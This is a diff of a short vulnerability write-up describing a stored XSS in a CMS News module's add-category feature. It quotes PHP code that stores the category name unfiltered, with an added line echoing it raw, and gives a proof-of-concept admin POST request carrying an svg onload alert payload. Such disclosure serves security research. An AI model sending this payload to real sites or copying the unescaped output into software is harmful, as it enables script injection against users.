@@ -2,31 +2,31 @@ One day I felt like reviewing the source code of some random CMS and I picked CM
 
 Stored XSS
 
-In Setting-New module,you can add category,there is no XSS filtering, resulting in storage-type XSS generation. 
+In Setting-New module,you can add category,there is no XSS filtering, resulting in storage-type XSS generation。  
 file modules/New/action.addcategory.php,line10~line29.  
-    ```` 
-    $name = trim($params['name']);
-    //if( $parent == 0 ) $parent = -1;
+	
     $name = trim($params['name']);
     if ($name != '') {
-    $query = 'SELECT news_category_id FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ? AND news_category_name = ?';
-    $tmp = $db->GetOne($query,array($parent,$name));
-    if( $tmp ) {
-    echo $this->ShowErrors($this->Lang('error_duplicatename'));
-    }
-    else {
-    $query = 'SELECT max(item_order) FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ?';
-    $item_order = (int)$db->GetOne($query,array($parent));
-    $item_order++;
-    $catid = $db->GenID(CMS_DB_PREFIX."module_news_categories_seq");
-    $query = 'INSERT INTO '.CMS_DB_PREFIX.'module_news_categories (news_category_id, news_category_name, parent_id, item_order, create_date, modified_date) VALUES (?,?,?,?,NOW(),NOW())';
-    $parms = array($catid,$name,$parent,$item_order);
-    $db->Execute($query, $parms);
-    ````  
-The parameter name insert into the database without filtering。
+		echo $name;
+        $query = 'SELECT news_category_id FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ? AND news_category_name = ?';
+        $tmp = $db->GetOne($query,array($parent,$name));
+        if( $tmp ) {
+            echo $this->ShowErrors($this->Lang('error_duplicatename'));
+        }
+        else {
+            $query = 'SELECT max(item_order) FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ?';
+            $item_order = (int)$db->GetOne($query,array($parent));
+            $item_order++;
+
+            $catid = $db->GenID(CMS_DB_PREFIX."module_news_categories_seq");
+
+            $query = 'INSERT INTO '.CMS_DB_PREFIX.'module_news_categories (news_category_id, news_category_name, parent_id, item_order, create_date, modified_date) VALUES (?,?,?,?,NOW(),NOW())';
+            $parms = array($catid,$name,$parent,$item_order);
+            $db->Execute($query, $parms);
+    
+  The parameter name insert into the database without filtering。
 
 ## POC  
-    ````
     POST /admin/moduleinterface.php HTTP/1.1
     Host: 127.0.0.1
     User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
@@ -40,7 +40,6 @@ The parameter name insert into the database without filtering。
     Upgrade-Insecure-Requests: 1
     mact=News%2Cm1_%2Caddcategory%2C0&_sk_=98cf4d97037a4df557b&m1_name=%3Csvg%2F+onload%3Dalert%281%29%3E&m1_parent=-1&m1_submit=%E6%8F%90%E4%BA%A4
     
-    ````
 ![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/94376829.jpg)
 ![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/48134010.jpg)
     
